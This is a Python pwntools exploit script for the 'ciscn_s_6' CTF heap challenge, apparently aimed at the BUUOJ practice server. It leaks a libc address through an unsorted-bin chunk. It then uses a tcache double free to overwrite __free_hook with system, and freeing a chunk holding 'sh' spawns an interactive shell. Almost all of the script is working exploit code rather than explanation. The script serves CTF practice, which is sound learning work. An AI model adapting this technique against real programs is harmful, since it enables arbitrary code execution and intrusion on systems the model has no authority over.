# -*- encoding: utf-8 -*-
import sys 
import os 
from pwn import * 
context.log_level = 'debug' 
#context.update( os = 'linux', arch = 'amd64',timeout = 1)
binary = './ciscn_s_6'
elf = ELF(binary)
libc = elf.libc
context.binary = binary
DEBUG = 0
if DEBUG:
    p = process(binary)
    #p = process(['qemu-aarch64','-L','',binary])
    #p = process(['qemu-aarch64','-L','',-g,'1234',binary])
else:
    host = 'node4.buuoj.cn'
    port = '27984'
    p = remote(host,port)
l64 = lambda            : u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00'))
l32 = lambda            : u32(p.recvuntil('\xf7')[-4:].ljust(4,'\x00'))
sla = lambda a,b        : p.sendlineafter(str(a),str(b))
sa  = lambda a,b        : p.sendafter(str(a),str(b))
lg  = lambda name,data  : p.success(name + ': 0x%x' % data)
se  = lambda payload    : p.send(payload)
rl  = lambda            : p.recv()
sl  = lambda payload    : p.sendline(payload)
ru  = lambda a          : p.recvuntil(str(a))
rint= lambda a          : int( p.recv(len(str(a)))[2:] , 16)
def dbg():
    gdb.attach(p)
    pause()

def bgdb(fun):
    gdb.attach(p,'b %s'%fun)

def cmd(num):
    sla('choice:',num)

def add(size,name,tel):
    cmd(1)
    sla("size of compary's name",size)
    sa("input name:",name)
    sla("compary call:",tel)

def show(idx):
    cmd(2)
    sla("index:",idx)

def delete(idx):
    cmd(3)
    sla("index:",idx)

add(0x420,"aaa","111")
add(0x10,"sh\x00","111")
add(0x10,"aaa","111")

delete(0)

show(0)
__malloc_hook = l64() - 0x70
lg("__malloc_hook",__malloc_hook)

libc.address = __malloc_hook - libc.sym["__malloc_hook"]
free_hook = libc.sym["__free_hook"]
system = libc.sym["system"]

delete(2)
delete(2)

add(0x10,p64(free_hook)+"\x00","\x00"*0x8)
add(0x10,p64(system),"\x00")

delete(1)
#dbg()


p.interactive()

'''
@File    :   ciscn_s_6.py
@Time    :   2021/07/24 20:35:06
@Author  :   Niyah 
'''